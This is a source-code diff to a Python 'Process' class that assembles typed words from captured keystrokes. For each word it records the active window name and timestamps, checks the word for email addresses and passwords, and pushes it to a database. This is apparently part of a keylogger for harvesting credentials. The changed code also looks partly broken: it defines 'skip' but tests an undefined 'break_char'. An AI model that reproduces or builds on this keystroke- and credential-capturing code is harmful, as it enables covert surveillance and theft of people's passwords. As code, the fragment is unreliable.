@@ -61,22 +61,25 @@ class Process:
     - Also check that if the first key we recieve is a Space or return, that this is not pushed to database
     '''
     def appendWord(self,data):
-        #skip = ["Return", "Space", "RShift","LShift", "Capital", "Back", "Escape", "Tab", "Delete","Down", "Right","Up","Left"]
-        if (data['processedKey']:
+        skip = ["Return", "Space"]
+        
+        if (data['processedKey']):
             print(data)
             if (len(self.word) == 0):
                 self.payload['datetime'] = data['datetime']
                 self.payload['epoch'] = data['epochTime']
                 self.payload['windowName'] = data['windowName']
             self.word += data['processedKey']
-        elif (self.payload['datetime'] != ""):
+        elif (data['keyName'] in break_char):
             #TODO: if last word, add the time pressed as end time
 
             self.payload['processedWord'] = self.word
             #self.resetWord()
             self.checkEmailPassword()
             self.pushDB_word()
-            
+        elif (data['keyName'] == "Back"):
+                #delete the last character in word
+                self.word = self.word[:-1]            
         return 0
         
   
